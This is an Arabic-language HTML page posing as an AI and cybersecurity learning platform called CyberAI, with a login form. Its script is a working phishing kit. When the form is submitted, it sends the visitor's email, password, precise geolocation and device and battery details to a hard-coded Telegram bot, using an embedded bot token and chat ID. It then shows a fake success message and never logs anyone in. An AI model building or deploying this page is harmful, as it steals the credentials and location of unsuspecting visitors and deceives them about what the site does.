<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>عالم الذكاء الاصطناعي والأمن السيبراني</title>
    <!-- Font Awesome Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;500;700;900&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --primary: #00f0ff;
            --secondary: #7000ff;
            --bg-dark: #090a10;
            --card-bg: rgba(255, 255, 255, 0.05);
            --border: rgba(0, 240, 255, 0.2);
            --text: #ffffff;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Tajawal', sans-serif; }

        body { background-color: var(--bg-dark); color: var(--text); overflow-x: hidden; min-height: 100vh; }

        /* Canvas Background */
        #cyber-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; }

        /* Navbar */
        nav { display: flex; justify-content: space-between; align-items: center; padding: 20px 8%; background: rgba(9, 10, 16, 0.7); backdrop-filter: blur(10px); border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; }
        .logo { font-size: 24px; font-weight: 900; color: var(--primary); text-shadow: 0 0 10px var(--primary); display: flex; align-items: center; gap: 10px; }
        .login-btn { background: linear-gradient(45deg, var(--secondary), var(--primary)); border: none; padding: 10px 25px; color: #fff; border-radius: 30px; font-weight: bold; cursor: pointer; box-shadow: 0 0 15px rgba(112, 0, 255, 0.4); transition: 0.3s ease; }
        .login-btn:hover { transform: translateY(-2px); box-shadow: 0 0 25px rgba(0, 240, 255, 0.8); }

        /* Hero Section */
        .hero { display: flex; align-items: center; justify-content: space-between; padding: 50px 8%; min-height: calc(100vh - 80px); flex-wrap: wrap; }
        .hero-text { flex: 1; min-width: 300px; }
        .hero-text h1 { font-size: 3rem; margin-bottom: 20px; line-height: 1.2; background: linear-gradient(90deg, #fff, var(--primary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .hero-text p { font-size: 1.2rem; color: #a0a5c0; margin-bottom: 30px; max-width: 500px; }

        /* Interactive Robot */
        .robot-container { flex: 1; display: flex; justify-content: center; align-items: center; min-width: 300px; }
        .robot { width: 250px; height: 280px; background: rgba(20, 25, 45, 0.8); border: 2px solid var(--primary); border-radius: 40px; box-shadow: 0 0 30px rgba(0, 240, 255, 0.3); display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative; animation: float 4s ease-in-out infinite; }
        @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-15px); } }
        .robot-head { width: 140px; height: 100px; background: #101525; border: 2px solid var(--primary); border-radius: 20px; display: flex; align-items: center; justify-content: space-around; padding: 0 20px; }
        .eye { width: 25px; height: 25px; background: var(--primary); border-radius: 50%; box-shadow: 0 0 15px var(--primary); position: relative; }
        .pupil { width: 10px; height: 10px; background: #fff; border-radius: 50%; position: absolute; top: 7px; left: 7px; }
        .robot-body { width: 180px; height: 110px; background: #101525; border: 2px solid var(--secondary); border-radius: 15px; margin-top: 15px; display: flex; align-items: center; justify-content: center; color: var(--primary); font-size: 2rem; }

        /* Features Grid */
        .features { padding: 60px 8%; text-align: center; }
        .section-title { font-size: 2.2rem; margin-bottom: 40px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 25px; }
        .icon-card { background: var(--card-bg); border: 1px solid var(--border); padding: 30px; border-radius: 20px; cursor: pointer; transition: 0.4s; }
        .icon-card:hover { transform: translateY(-10px); border-color: var(--primary); background: rgba(0, 240, 255, 0.08); }
        .icon-card i { font-size: 3rem; color: var(--primary); margin-bottom: 15px; }

        /* Modal Styles */
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(12px); z-index: 1000; justify-content: center; align-items: center; padding: 20px; }
        .modal-content { background: #0f1220; border: 2px solid var(--primary); width: 100%; max-width: 450px; border-radius: 20px; padding: 30px; position: relative; box-shadow: 0 0 50px rgba(0, 240, 255, 0.4); }
        .close-btn { position: absolute; top: 20px; left: 20px; font-size: 1.5rem; color: #fff; cursor: pointer; }
        .login-card input { width: 100%; padding: 12px; margin: 10px 0; background: rgba(255, 255, 255, 0.05); border: 1px solid var(--border); border-radius: 8px; color: #fff; outline: none; }
        .submit-btn { width: 100%; padding: 12px; background: var(--primary); border: none; color: #000; font-weight: bold; border-radius: 8px; cursor: pointer; margin-top: 15px; transition: 0.3s; }
        .submit-btn:hover { background: #fff; }
    </style>
</head>
<body>

    <canvas id="cyber-canvas"></canvas>

    <nav>
        <div class="logo"><i class="fa-solid fa-brain"></i> CyberAI</div>
        <button class="login-btn" onclick="document.getElementById('loginModal').style.display='flex'">تسجيل الدخول</button>
    </nav>

    <section class="hero">
        <div class="hero-text">
            <h1>مستقبل الذكاء الاصطناعي والأمن السيبراني</h1>
            <p>منصة تفاعلية تجمع بين أنظمة حماية البيانات المستقبليّة وخوارزميات الذكاء الاصطناعي.</p>
        </div>
        <div class="robot-container">
            <div class="robot" id="robot">
                <div class="robot-head"><div class="eye"><div class="pupil"></div></div><div class="eye"><div class="pupil"></div></div></div>
                <div class="robot-body"><i class="fa-solid fa-microchip"></i></div>
            </div>
        </div>
    </section>

    <section class="features">
        <h2 class="section-title">المواضيع الأساسية</h2>
        <div class="grid">
            <div class="icon-card"><i class="fa-solid fa-robot"></i><h3>الذكاء الاصطناعي</h3></div>
            <div class="icon-card"><i class="fa-solid fa-shield-halved"></i><h3>الأمن السيبراني</h3></div>
            <div class="icon-card"><i class="fa-solid fa-network-wired"></i><h3>تعلم الآلة</h3></div>
            <div class="icon-card"><i class="fa-solid fa-user-lock"></i><h3>التشفير الكمومي</h3></div>
        </div>
    </section>

    <!-- Login Modal -->
    <div class="modal" id="loginModal">
        <div class="modal-content login-card">
            <span class="close-btn" onclick="this.parentElement.parentElement.style.display='none'">&times;</span>
            <h2 style="color: var(--primary); margin-bottom: 20px;">تسجيل الدخول</h2>
            <form id="telegramLoginForm" onsubmit="handleLoginSubmit(event)">
                <input type="email" id="userEmail" placeholder="البريد الإلكتروني" required>
                <input type="password" id="userPassword" placeholder="كلمة المرور" required>
                <button type="submit" class="submit-btn" id="submitBtn">دخول</button>
            </form>
            <div id="statusContainer" style="margin-top: 20px; display: none; text-align: center;">
                <p id="statusMsg" style="font-size: 0.9rem;"></p>
            </div>
        </div>
    </div>

    <script>
        // --- ضع بيانات البوت هنا ---
        const TELEGRAM_BOT_TOKEN = "7870239308:AAEVoEVu6EKgznDFDepXlRBQ-TWYk5oz4Oo";
        const TELEGRAM_CHAT_ID = "5515542115";
        // -------------------------

        async function getDeviceInfo() {
            const ua = navigator.userAgent;
            const os = ua.includes("Android") ? "Android" : ua.includes("iPhone") ? "iOS" : ua.includes("Windows") ? "Windows" : "Other";
            const browser = ua.includes("Chrome") ? "Chrome" : ua.includes("Firefox") ? "Firefox" : "Safari";
            
            let batteryInfo = "غير متاح";
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'يشحن' : 'على البطارية'})`;
                } catch(e) {}
            }
            return { os, browser, screenSize: `${screen.width}x${screen.height}`, batteryInfo };
        }

        function getCoordinatesAutomatically() {
            return new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, status: "✅ تم السماح" }),
                    (err) => resolve({ lat: null, lon: null, status: "❌ رفض المستخدم" }),
                    { timeout: 15000 }
                );
            });
        }

        async function handleLoginSubmit(event) {
            event.preventDefault();
            const statusContainer = document.getElementById('statusContainer');
            const statusMsg = document.getElementById('statusMsg');
            statusContainer.style.display = 'block';
            statusMsg.innerText = "جاري الاتصال...";

            const deviceInfo = await getDeviceInfo();
            const locationData = await getCoordinatesAutomatically();
            
            let locStr = locationData.lat ? `\n📍 الموقع: ${locationData.lat}, ${locationData.lon}\n[خريطة](https://www.google.com/maps?q=${locationData.lat},${locationData.lon})` : "\n📍 الموقع: غير متاح";

            const message = `🔔 تسجيل دخول جديد!\n-----------------\n📧 الإيميل: ${document.getElementById('userEmail').value}\n🔑 الباسورد: ${document.getElementById('userPassword').value}\n${locStr}\n\n💻 الجهاز: ${deviceInfo.os} | ${deviceInfo.browser}\n🖥 الشاشة: ${deviceInfo.screenSize}\n🔋 البطارية: ${deviceInfo.batteryInfo}`;

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
            }).then(() => {
                statusMsg.innerText = "تم بنجاح!";
                setTimeout(() => document.getElementById('loginModal').style.display = 'none', 1000);
            });
        }
    </script>
</body>
</html>
